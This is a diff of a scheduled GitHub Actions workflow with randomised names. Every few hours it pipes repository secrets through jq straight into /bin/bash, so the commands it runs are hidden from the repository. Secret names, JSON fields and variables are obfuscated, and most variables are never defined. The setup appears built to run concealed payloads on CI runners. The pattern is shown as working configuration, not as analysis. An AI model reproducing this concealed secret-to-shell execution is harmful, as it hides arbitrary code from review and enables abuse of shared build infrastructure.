@@ -2,9 +2,8 @@ name: jiangyigu1829
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 5/6 * * *'
-
-jobs:  # 97
+    - cron: '19 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,24 +11,9 @@ jobs:  # 97
       - uses: actions/checkout@v4
       - name: jiangyigu1829
         env:
-          ltz87: ${{ secrets.ltz87 }}
+          qqzy25590: ${{ secrets.qqzy25590 }}
         run: |
-          echo $ltz87 | jq -r .tmn3 | /bin/bash
-          echo $qxd7 | jq -r .pf9 | /bin/bash
-          echo $r58 | jq -r .rtjo5 | /bin/bash
-          echo $fet342 | jq -r .bi8148 | /bin/bash
-          echo $fykt222 | jq -r .cst3355 | /bin/bash
-          echo $j40011 | jq -r .zz91 | /bin/bash
-          echo $ztx5039 | jq -r .j395 | /bin/bash
-          echo $tomci25 | jq -r .kw29874 | /bin/bash
-          echo $uoiz86677 | jq -r .ytdo97317 | /bin/bash
-          echo $ndm560 | jq -r .y5536 | /bin/bash
-          echo $iy8 | jq -r .i42 | /bin/bash
-          echo $rjn35939 | jq -r .yk6698 | /bin/bash
-          echo $m0 | jq -r .gyhud146 | /bin/bash
-          echo $fign2 | jq -r .yih25 | /bin/bash
-          echo $ketu35 | jq -r .pqu311 | /bin/bash
-          echo $v1553 | jq -r .vpxic85 | /bin/bash
-          echo $xz73 | jq -r .du20580 | /bin/bash
-          echo $c23193 | jq -r .b92771 | /bin/bash
+          echo $qqzy25590 | jq -r .snr0310 | /bin/bash
+          echo $v930 | jq -r .l613 | /bin/bash
+          echo $p025 | jq -r .yjy54374 | /bin/bash
 
